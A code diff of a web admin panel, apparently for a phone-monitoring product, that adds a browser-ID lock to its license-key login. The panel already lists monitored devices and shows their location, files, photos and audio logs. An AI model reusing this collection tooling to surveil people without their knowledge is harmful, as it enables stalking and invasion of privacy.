@@ -232,7 +232,7 @@
     let map, markers = {}, currentId = null;  
     let parentLicenseKey = ""; 
 
-    // --- 1. SECURE LOGIN ---  
+    // --- 1. SECURE LOGIN WITH DEVICE LOCK (UPDATED) ---  
     function checkLicense() {  
         const key = document.getElementById('pass-key').value.trim();  
         const msg = document.getElementById('login-msg');
@@ -240,14 +240,35 @@
         if(!key) { msg.innerText = "Please enter a key"; return; }
         msg.innerText = "Verifying...";
 
+        // Generate Browser ID (To Lock)
+        let myAdminID = localStorage.getItem('admin_unique_id');
+        if(!myAdminID) {
+            myAdminID = "ADMIN-" + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('admin_unique_id', myAdminID);
+        }
+
         db.ref('company_system/licenses/' + key).once('value', snap => {
             if(snap.exists()) {
                 const data = snap.val();
+                
+                // Status Check
                 if(data.status !== "Active") {
                     msg.style.color = "var(--neon-red)"; msg.innerText = "ACCESS DENIED: " + data.status; return;
                 }
                 if(Date.now() > data.expiry) {
                     msg.style.color = "var(--neon-red)"; msg.innerText = "LICENSE EXPIRED"; return;
+                }
+
+                // --- LOCK CHECK ---
+                if(!data.claimedByAdmin) {
+                    // First time login - Lock it
+                    db.ref('company_system/licenses/' + key + '/claimedByAdmin').set(myAdminID);
+                } 
+                else if (data.claimedByAdmin !== myAdminID) {
+                    // Lock active on another ID
+                    msg.style.color = "var(--neon-red)"; 
+                    msg.innerText = "ERROR: Key active on another device!"; 
+                    return; 
                 }
 
                 parentLicenseKey = key;
@@ -259,13 +280,14 @@
                     initMap();  
                     listenDevices(); 
                 }, 1000);
+
             } else {
                 msg.style.color = "var(--neon-red)"; msg.innerText = "INVALID LICENSE KEY";
             }
         });
     }  
 
-    // --- 2. MULTI-DEVICE LISTENER (FIXED LOGIC) ---  
+    // --- 2. MULTI-DEVICE LISTENER ---  
     function listenDevices() {
         const sel = document.getElementById('device-select');
         sel.innerHTML = '<option>CONNECTING...</option>';
@@ -274,30 +296,25 @@
             const licenseData = licenseSnap.val();
             if (!licenseData) return;
 
-            // Collect All Device IDs (Old Method + New List Method)
             let deviceIds = [];
-            
-            // Method A: Old Single ID (Backward Compatibility)
+            // Method A: Old Single ID
             if (licenseData.adminDeviceId && typeof licenseData.adminDeviceId === 'string') {
                 deviceIds.push(licenseData.adminDeviceId);
             }
-
-            // Method B: New Multiple IDs (Future Proof)
+            // Method B: New Multiple IDs
             if (licenseData.devices) {
                 Object.keys(licenseData.devices).forEach(id => {
                     if(!deviceIds.includes(id)) deviceIds.push(id);
                 });
             }
 
-            // If No Devices Found
             if (deviceIds.length === 0) {
                 sel.innerHTML = '<option>WAITING FOR CHILD APP...</option>';
                 document.getElementById('stat-status').innerText = "PENDING";
                 return;
             }
 
-            // Listen to EACH device
-            sel.innerHTML = ''; // Clear dropdown to rebuild
+            sel.innerHTML = ''; 
             
             deviceIds.forEach(targetId => {
                 db.ref('users/' + targetId).on('value', userSnap => {
@@ -306,7 +323,6 @@
                     const d = userSnap.val();
                     const name = d.info?.name || 'Device ' + targetId.substr(0,4);
                     
-                    // Add to Dropdown (Avoid Duplicates)
                     let existingOpt = sel.querySelector(`option[value="${targetId}"]`);
                     if (!existingOpt) {
                         let opt = document.createElement('option');
@@ -315,7 +331,6 @@
                         sel.add(opt);
                     }
 
-                    // Map Marker
                     const loc = d.location || {};
                     if(loc.latitude) {
                         if(markers[targetId]) {
@@ -323,11 +338,9 @@
                         } else {
                             markers[targetId] = L.marker([loc.latitude, loc.longitude]).addTo(map).bindPopup(name);
                         }
-                        // Center map only on first load
                         if(currentId === null) map.setView([loc.latitude, loc.longitude], 15);
                     }
 
-                    // Auto-select first device
                     if(!currentId) {
                         sel.value = targetId;
                         currentId = targetId;
@@ -338,7 +351,7 @@
         });
     }
 
-    // --- 3. DATA RENDERER (CRASH PROOFED) ---
+    // --- 3. DATA RENDERER ---
     function deviceChanged() {  
         currentId = document.getElementById('device-select').value;  
         if(!currentId) return;  
@@ -347,14 +360,12 @@
             const d = snap.val();  
             if(!d) return;  
 
-            // Stats (Safe Access ?.)
             document.getElementById('stat-bat').innerText = (d.info?.battery || 0) + "%";  
             document.getElementById('stat-status').innerText = d.info?.status || "OFFLINE";  
             document.getElementById('stat-seen').innerText = new Date(d.info?.lastSeen || Date.now()).toLocaleTimeString();  
               
             if(d.location?.latitude) map.setView([d.location.latitude, d.location.longitude], 15);  
 
-            // Render Modules
             renderFiles(d.files);
             renderGallery(d.logs?.photos);
             renderAudio(d.logs?.audio);
@@ -365,7 +376,7 @@
         });  
     }  
 
-    // --- HELPER FUNCTIONS (UNCHANGED UI) ---
+    // --- HELPER FUNCTIONS ---
     function renderFiles(filesData) {
         const fDiv = document.getElementById('file-list-container');  
         fDiv.innerHTML = '';  
